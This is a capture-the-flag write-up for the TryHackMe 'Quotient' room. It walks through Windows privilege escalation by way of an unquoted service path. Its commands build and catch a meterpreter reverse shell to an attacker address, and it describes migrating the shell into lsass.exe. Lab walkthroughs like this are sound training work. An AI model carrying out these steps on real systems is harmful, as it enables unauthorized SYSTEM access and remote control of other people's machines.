---
description: https://tryhackme.com/room/quotient
---

# Quotient

## Nmap

```
sudo nmap 10.10.75.30 -Pn -sV -sS 

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### RDP Login

Starting out we connect via RDP with the credentials provided by the room.

```
xfreerdp /v:'10.10.75.30' /u:'sage' /p:'gr33ntHEphgK2&V' +clipboard /dynamic-resolution
```

### Powerup

Now connected to the target system as the user sage we execute `Invoke-AllChecks` with `Powerup` and identify a binary service with an unquoted path that executes in the context of SYSTEM.

![](<../../../.gitbook/assets/image (4) (2) (1) (1).png>)

### Unquoted Service Path

Viewing the file permissions in the path `C:\Program Files\Development Files\Devservice Files\Service.exe`  we see that we do not have permission over service.exe, but the Users principal does have the ability to create files within `C:\Program Files\Development Files`.

This is enough for us to perform the unquoted service path privilege escalation vector.

![](<../../../.gitbook/assets/image (7) (1) (2).png>)

Due to the way Windows searches for binaries that are not wrapped in quotes with spaces, the system will search for an executable in the following order when the service is started.

1. C:\Program.exe
2. C:\Program Files\Development.exe
3. C:\Program Files\Development Files\Devservice.exe
4. C:\Program Files\Development Files\Devservice Files\Service.exe

As we have write access to `C:\Program Files\Development Files` we will be targeting option number 3.

### Building the attack

Firstly to perform the attack we create a `meterpreter` reverse shell called `Devservice.exe`

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.11.54.237 LPORT=80 -f exe -o Devservice.exe 
```

After the payload is built we then upload it to the target system and place the executable in `C:\Program Files\Development Files\Devservice.exe` . We do not have permission to restart the service, we do however have the ability to restart the target system.

Start a listener with `Metasploit`.

```
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.11.54.237; set lport 80; exploit"
```

### Triggering the payload

Then reboot the target system. After a minute or two we should receive a shell back.

![](<../../../.gitbook/assets/image (2) (2) (1).png>)

For some reason my `meterpreter` shell would soon die after connecting. As such I migrated to an alternative process (lsass.exe).

![](<../../../.gitbook/assets/image (6) (3) (1).png>)

### Root flag

With confirmed **SYSTEM** level access I was then able to retrieve the administrator's flag.

![](<../../../.gitbook/assets/image (67) (3).png>)
